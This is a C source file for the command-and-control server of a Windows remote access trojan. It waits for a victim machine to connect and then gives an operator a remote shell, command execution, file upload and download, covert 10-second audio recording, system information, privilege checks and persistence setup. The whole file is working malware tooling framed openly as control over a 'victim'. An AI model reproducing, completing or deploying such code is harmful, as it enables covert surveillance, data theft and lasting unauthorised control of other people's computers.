#include <stdio.h>
#include <stdbool.h>
#include <string.h> 
#include <stdlib.h> 
#include <sys/types.h>   
#include <signal.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 
#include <sys/stat.h>
#include <direct.h>
#include <sys/types.h>
#include <stdio.h>
#include <shlwapi.h>
#include <locale.h>
#include <Mmsystem.h>
#include "../src/base64.c"

/*

- Arreglar salida en download
- Upload funciona perfectemente

*/

//Vars globales


// Definiciones
#define SOCKBUFFER 2048

//Colores
#define GREEN   FOREGROUND_GREEN
#define RED     FOREGROUND_RED
#define BLUE    FOREGROUND_BLUE
#define YELLOW  FOREGROUND_GREEN | FOREGROUND_RED
#define PURPLE  FOREGROUND_RED | FOREGROUND_BLUE
#define CYAN    FOREGROUND_GREEN | FOREGROUND_BLUE
#define WHITE   FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE

// Prototipo
int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
int readSendFile(SOCKET targetConn, char *filename, char *instruct);
int startRecord(char* command, SOCKET targetConn, char* clientIP);
int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
int downloadFunc(char *command, SOCKET targetConn, char *ip);
int getSystemInformation(SOCKET targetConn, char* command);
int setLowPersistence(SOCKET targetConn, char *command);
int checkPermissons(SOCKET targetConn, char *command);
int startServer();
void helpPannel();
void ctrlCHandler(int sig);
void checkStart(char *IPAddress);
void printColor(char* text, int color);
void printProgressBar(long current, long total);
void StartSending(SOCKET targetConn, char *instruct);
void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
long get_file_size(char* filename);

long get_file_size(char* filename) {
    struct _stat file_status;
    if (_stat(filename, &file_status) < 0) {
        return -1;
    }
    return file_status.st_size;
}

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printColor("\n\n\t[!] ", RED); printColor("Saliendo: Ctrl + C detectado... \n\n", YELLOW); 
    exit(1);
}

int getSystemInformation(SOCKET targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char recvData[SOCKBUFFER];
    memset(recvData, 0, SOCKBUFFER);

    while (true){
        recv(targetConn, recvData, SOCKBUFFER, 0);
        if (strstr(recvData, "end\0") == 0){
            printf("%s", recvData);
            break;
        }
    }
    return 0;
    //return recvData;   
}


void printColor(char* text, int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
    printf("%s", text);
    SetConsoleTextAttribute(hConsole, WHITE); // Reset to white after printing
}

void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u\n\n", clientIP, clientPort);
    printColor("\n\t[*>] ", YELLOW); printColor("Closing Connection to", RED); printf(" ===> "); printColor(formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    closesocket(targetConn);
}
 
void checkStart(char *IPAddress){
    char formed[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
    struct stat buffer;
    if (stat("./DATA", &buffer) != 0) {
        mkdir("./DATA"); 
    }
    if (stat(formed, &buffer) != 0){
        mkdir(formed);   
    }  
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] download <file>       -> Download from target \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] exec <command>        -> Execute commands on NO shell mode\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] record                -> Record 10s of audio\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] record                -> Record a 10S of audio.\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] check                 -> Check privileges\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

void StartSending(SOCKET targetConn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "upload ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    readSendFile(targetConn, file, instruct);

}

int readSendFile(SOCKET targetConn, char *filename, char *instruct){
    send(targetConn, instruct, strlen(instruct), 0); 
    long fullBytes = get_file_size(filename);

    if (fullBytes == -1){
        printColor("\n\t[!>] ", RED); printColor("No se puede abrir el archivo.\n\n", YELLOW);        
        send(targetConn, "end\0", strlen("end\0"), 0);
        return 1;
    }

    FILE *fp;
    fp = fopen(filename, "rb");

    unsigned char readData[SOCKBUFFER];
    long fullReaded;
    size_t bytesRead;
    printf("\n");

    while (true){
        if ((bytesRead = fread(readData, 1, SOCKBUFFER - 1, fp)) <= 0)
            break;

        readData[bytesRead] = '\0';
        send(targetConn, (char *)readData, bytesRead, 0);
        memset(readData, 0, SOCKBUFFER);
        fullReaded += bytesRead;
        
        printProgressBar(fullReaded, fullBytes);
        
    }

    printf("\n");
    fclose(fp);
    Sleep(300);
    send(targetConn, "end\0", strlen("end\0"), 0); 
    printColor("\n\t[*>] ", YELLOW); printColor("File Uploaded Successfully.\n\n", BLUE);
    return 0;

}

int sndAndExecCmd(SOCKET targetConn, char *command, char *resp){ 
    //Limpiar buffer
    memset(resp, 0, sizeof(resp));
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else {
            printf("%s", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    return 0;
}

int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
    // Variables Necesarias
    char command[255] = "";
    char resp[SOCKBUFFER];
    char formattedString[50] = "";

    printColor("\n\t[*>] ", YELLOW); printColor("Entering Shell Mode\n\n", BLUE);
    send(targetConn, "shell", strlen("shell"), 0);

    snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);

    while (true) {

        printColor("\n<*", YELLOW); printColor(" Shell ", RED); printColor(formattedString, YELLOW);
        //printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 
 
            printColor("\n\t[*>] ", YELLOW); printColor("Exiting Shell Mode\n\n", BLUE);
            send(targetConn, command, strlen(command), 0);
            break;

        } else if (strstr(command, "exit") != NULL){ 
            printColor("\n\t[!>] ", RED); printColor("For exit shell mode type 'q'\n\n", YELLOW);

        } else if (strlen(command) == 0){
            continue; 
        } else{
            sndAndExecCmd(targetConn, command, resp);
        }
    }    
    return 0;

}

char *replaceFile(char *command, char *toReplace){
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    file[remainingLength] = '\0'; 

    return file;
}

int downloadFunc(char *command, SOCKET targetConn, char *ip){
    send(targetConn, command, strlen(command), 0);

    char formed[500];
    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);

    // Tamaño máximo del archivo 
    char bytesStr[100];
    recv(targetConn, bytesStr, 100, 0);
    long fullBytes;
    fullBytes = atoi(bytesStr);

    if (fullBytes == -1){
        printColor("\n\t[*>] ", RED); printColor("Error Downloading file ", YELLOW); printf("\n");
        return 1;
    }

    // Encontrar nombre de base (NO RUTA COMPLETA)
    char *basename = PathFindFileName(replaceFile(command, "download "));
    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(basename, YELLOW); printColor(formed, BLUE); printf("\n");
    
    // Preparar el bucle de recepción de datos
    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, basename);  
    FILE *fp;
    fp = fopen(formed, "wb");
    unsigned char recvData[SOCKBUFFER];
    int bytesReadCurrent = 0;
    size_t bytesRead = 0;


    while (true){
        bytesReadCurrent = recv(targetConn, (char *)recvData, SOCKBUFFER, 0);
        
        if (bytesReadCurrent < SOCKBUFFER - 1){
            fwrite(recvData, 1, bytesReadCurrent, fp);
            memset(recvData, 0, SOCKBUFFER);            
            break;
        }

        /*
        if (strcmp((char *)recvData, "end\0") == 0){
                break;
            }
        */
        
        fwrite(recvData, 1, bytesReadCurrent, fp);
        bytesRead += bytesReadCurrent;
        printProgressBar(bytesRead, fullBytes);
        memset(recvData, 0, SOCKBUFFER);
    }

    fclose(fp);

}

int setPersistence(SOCKET targetConn, char *command, char *method){
    send(targetConn, command, strlen(command), 0);
    char recvData[SOCKBUFFER];
    memset(recvData, 0, sizeof(recvData));

    recv(targetConn, recvData, SOCKBUFFER, 0);

    if (strcmp(method, "low") == 0){
        if (strstr("error", recvData) != NULL){
            printColor("\n\n\t[!>] ", RED); printColor("Error geting low persistence...", YELLOW);
        }
        else if (strstr("exito", recvData) != NULL){
            printColor("\n\t[*>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);    
        }
    }

    if (strcmp(method, "high") == 0){
        if (strstr("error", recvData) != NULL){
            printColor("\n\n\t[!>] ", RED); printColor("Error high persistence...", YELLOW);    
        
        } else if (strstr("exito", recvData) != NULL){
            printColor("\n\t[*>] ", YELLOW); printColor("High persistence setted succsessfully...\n", BLUE);

        } else if (strstr("permissonError", recvData) != NULL){
            printColor("\n\t[!>] ", YELLOW); printColor("Error setting persistence, PermissonError...\n", BLUE);
        
        }
    }

    return 0;
}

int checkPermissons(SOCKET targetConn, char *command){
    send(targetConn, command,  strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);  

    recv(targetConn, recvData, SOCKBUFFER, 0);
    if (strstr(recvData, "yes") != NULL){
        printColor("\n\t[*>] ", YELLOW); printColor("Admin Privileges...\n", BLUE);
    
    } else if (strstr(recvData, "no") != NULL){
        printColor("\n\t[*>] ", YELLOW); printColor("User Privileges...\n", BLUE);
    } 

    free(recvData);
    return 0;
}

void printProgressBar(long current, long total) {
    int barWidth = 50;
    float progress = (float)current / total;
    int pos = (int)(barWidth * progress);

    printColor("\t\t[", YELLOW);
    for (int i = 0; i < barWidth; i++) {
        if (i < pos) {
            printColor("#", GREEN);
        }
        else {
            printf(" "); // Espacio en blanco para el fondo
        }
    }
    printColor("]", YELLOW);
    printf(" %.2f%%", progress * 100);

    // Agregar un retorno de carro para volver al principio de la línea
    printf("\r");
    fflush(stdout);
}

int startRecord(char *command, SOCKET targetConn, char* clientIP) {
    printColor("\n\t[*>] ", BLUE); printColor("Recording Audio for", YELLOW); printf("10s\n\n");
    send(targetConn, command, strlen(command), 0);
    Sleep(9999);

    char voiceName[255];
    snprintf(voiceName, 255, "./DATA/%s/record-voice-%s.wav", clientIP, clientIP);
    
    char FullBytesSTR[100];
    recv(targetConn, FullBytesSTR, 100, 0);
    long FullBytesInt = atoi(FullBytesSTR);

    char recvVoice[SOCKBUFFER];
    memset(recvVoice, 0, SOCKBUFFER);
    int recivedBytes = 0;
    FILE* fp = fopen(voiceName, "wb");

    while (true) {
        int bytesRecv = recv(targetConn, recvVoice, SOCKBUFFER, 0);         

        if (strstr(recvVoice, "end\0") != NULL) 
            break;

        fwrite(recvVoice, 1, bytesRecv, fp);
        memset(recvVoice, 0, 2048);
        
        recivedBytes += bytesRecv; 
        printProgressBar(recivedBytes, FullBytesInt);
    }
    printf("\n");
    fclose(fp);
    
    printColor("\n\t[*>] ", RED); printColor("Audio recived succsessfully, check --", YELLOW); printf("%s\n", voiceName);
    return 0;
}

int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
    char command[SOCKBUFFER] = "";
    char resp[SOCKBUFFER];
    char formattedString[50] = "";

    //Estructura de carpetas:
    checkStart(clientIP);

    snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);
    while (true){
        printColor("\n<*", YELLOW); printColor(" C&C ", RED); printColor(formattedString, YELLOW); 
        fgets(command, sizeof(command), stdin); 
        
        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
        
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else { 
            // Panel de ayuda
            if (strcmp(command, "help") == 0 || strcmp(command, "h") == 0){
                helpPannel();              

            // Descargar Archivo remoto
            } else if (strstr(command, "download") != NULL){
                downloadFunc(command, targetConn, clientIP); 
            
            // Entrar en modo shell
            } else if (strcmp(command, "shell") == 0){
                shell(targetConn, clientIP, clientPort);
            
            // Ejecutar comando 
            } else if (strstr(command, "exec") != NULL){
                char resp[SOCKBUFFER]; memset(resp, 0, sizeof(resp));
                sndAndExecCmd(targetConn, command, resp); 
            
            // Subir Archivo local
            } else if(strstr(command, "upload") != NULL){
                StartSending(targetConn, command);
                
            // Comando no reconocido
            } else if (strcmp(command, "sysinfo") == 0){
                getSystemInformation(targetConn, command);
                
            } else if (strcmp(command, "lowpersistence") == 0){
                setPersistence(targetConn, command, "low");
        
            } else if (strcmp(command, "persistence") == 0){
                setPersistence(targetConn, command, "high");
        
            } else if (strcmp(command, "check") == 0){
                checkPermissons(targetConn, command);
        
            }else if (strcmp(command, "record") == 0) { 
                startRecord(command, targetConn, clientIP); 

            }
            else {
                printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
            }
        }
    }
    return 0;
}

int startServer(){
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Failed to initialize Winsock");
        exit(1);
    }

    // Creamos el socket del cliente
    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9000);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    SOCKET targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[16];  // String para almacenar la dirección IP
    strcpy(clientIP, inet_ntoa(clientAddr.sin_addr));

    // Obtenemos el puerto del cliente
    unsigned short clientPort = ntohs(clientAddr.sin_port);

    //printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);
    printColor("\t[>] ", YELLOW); printColor("New Connection From: ", RED); printf("%s-%u\n", clientIP, clientPort);
 
    mainFunction(targetConn, clientIP, clientPort);
    

}



int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    //printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    printColor("\n[!>] ", YELLOW); printColor("Waiting For target to connect...\n\n", RED);
    startServer();
    return 0;

}
